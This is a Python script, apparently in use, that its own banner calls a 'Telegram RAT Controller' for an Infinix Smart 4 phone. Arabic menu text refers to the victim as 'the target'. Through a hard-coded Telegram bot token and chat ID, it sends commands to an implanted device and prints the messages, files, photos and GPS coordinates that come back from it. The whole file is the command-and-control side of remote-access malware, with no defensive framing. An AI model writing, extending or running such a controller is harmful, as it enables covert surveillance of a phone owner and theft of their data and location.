#!/usr/bin/env python3
import requests, time, os, sys, re
from datetime import datetime

BOT_TOKEN = "8618349247:AAH25CSzXU5ESrOyUf6_zoLRi8U1JVz05a8"
CHAT_ID = "8278195073"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

class BotController:
    def __init__(self):
        self.last_update_id = 0
        self.session_start = datetime.now()

    def send_command(self, command: str) -> bool:
        try:
            resp = requests.post(f"{API_URL}/sendMessage", data={"chat_id": CHAT_ID, "text": command}, timeout=10)
            return resp.status_code == 200
        except:
            return False

    def listen(self):
        try:
            resp = requests.get(f"{API_URL}/getUpdates", params={"offset": self.last_update_id + 1, "timeout": 30}, timeout=35)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        self.last_update_id = update['update_id']
                        if 'message' not in update:
                            continue
                        msg = update['message']
                        sender_id = str(msg.get('from', {}).get('id', ''))
                        if sender_id == CHAT_ID and 'text' in msg and msg['text'].startswith('/'):
                            continue
                        t = datetime.fromtimestamp(msg['date']).strftime('%H:%M:%S')
                        if 'text' in msg:
                            clean = re.sub(r'<[^>]+>', '', msg['text'])
                            print(f"\n{'='*60}\n[{t}] 📱 الهدف:\n{'─'*60}\n{clean}\n{'='*60}")
                        elif 'document' in msg:
                            doc = msg['document']
                            print(f"\n[{t}] 📁 ملف: {doc.get('file_name','?')} ({doc.get('file_size',0)/1024:.1f}KB)")
                        elif 'photo' in msg:
                            print(f"\n[{t}] 📸 صورة: {msg.get('caption','')}")
                        elif 'location' in msg:
                            loc = msg['location']
                            print(f"\n[{t}] 📍 {loc.get('latitude')}, {loc.get('longitude')}")
            return True
        except requests.exceptions.Timeout:
            return True
        except:
            time.sleep(2)
            return False

    def interactive(self):
        os.system('clear')
        print("""╔══════════════════════════════════╗
║   Telegram RAT Controller v1.0  ║
║   Infinix Smart 4 | MT6761      ║
╚══════════════════════════════════╝""")
        print(f"🕐 الجلسة: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}")
        print("📋 افتح تيليجرام → بوتك → أرسل الأوامر")
        print("📋 /help لعرض الأوامر")
        print("─" * 60)
        print("في انتظار الردود...")
        print("─" * 60)
        errors = 0
        try:
            while True:
                if not self.listen():
                    errors += 1
                    if errors > 5:
                        print("⚠️ مشكلة اتصال...")
                        time.sleep(5)
                        errors = 0
                else:
                    errors = 0
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n👋 انتهت الجلسة - {int((datetime.now()-self.session_start).seconds/60)} دقيقة")

    def quick_status(self) -> str:
        try:
            self.send_command("/ping")
            time.sleep(3)
            resp = requests.get(f"{API_URL}/getUpdates", params={"offset": self.last_update_id+1, "timeout": 5}, timeout=10).json()
            if resp.get('result'):
                for u in resp['result']:
                    if 'message' in u and 'text' in u['message'] and 'pong' in u['message']['text'].lower():
                        return "🟢 متصل"
            return "🔴 غير متصل"
        except:
            return "⚫ خطأ"


def main():
    ctrl = BotController()
    while True:
        os.system('clear')
        print("""╔══════════════════════════════════╗
║   Telegram RAT Controller v1.0  ║
║   Infinix Smart 4 | MT6761      ║
╚══════════════════════════════════╝
    [1] الوضع التفاعلي
    [2] فحص حالة الهدف
    [3] إرسال أمر سريع
    [4] خروج
""")
        ch = input("    الخيار > ").strip()
        if ch == '1':
            ctrl.interactive()
        elif ch == '2':
            print(f"\n    {ctrl.quick_status()}")
            input("    Enter...")
        elif ch == '3':
            cmd = input("\n    الأمر: ").strip()
            if cmd:
                ctrl.send_command(cmd)
                print(f"    ✅ تم إرسال: {cmd}")
            input("    Enter...")
        elif ch == '4':
            print("\n    👋 مع السلامة!")
            sys.exit(0)


if __name__ == '__main__':
    main()
